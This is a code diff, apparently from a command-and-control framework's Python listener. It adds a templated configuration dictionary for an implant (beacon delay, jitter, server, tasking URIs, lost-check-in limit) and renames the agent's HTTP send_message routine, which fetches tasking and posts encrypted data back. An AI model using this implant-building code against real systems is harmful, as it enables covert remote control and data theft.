@@ -703,6 +703,22 @@ class Listener:
             return code
 
         elif language == 'python':
+            listener_dict = """
+{
+    'delay' : {delay},
+    'jitter' : {jitter},
+    'profile': "{profile}",
+    'server': "{server}",
+    'fixed_parameters': {
+        'headers' : "{headers}",
+        'taskURIs' : "{taskURIs}",
+    },
+    'send_func': send_message_HTTP,
+    'lostLimit': {lostLimit},
+    'missedCheckins':0,
+},
+#LISTENER_DICT
+"""
             f = open(self.mainMenu.installPath + "./data/agent/agent.py")
             code = f.read()
             f.close()
@@ -842,7 +858,7 @@ class Listener:
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
 
                 sendMessage = """
-def send_message(packets=None, server = None, headers = None, taskURIs = None):
+def send_message_HTTP(packets=None, server = None, headers = None, taskURIs = None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
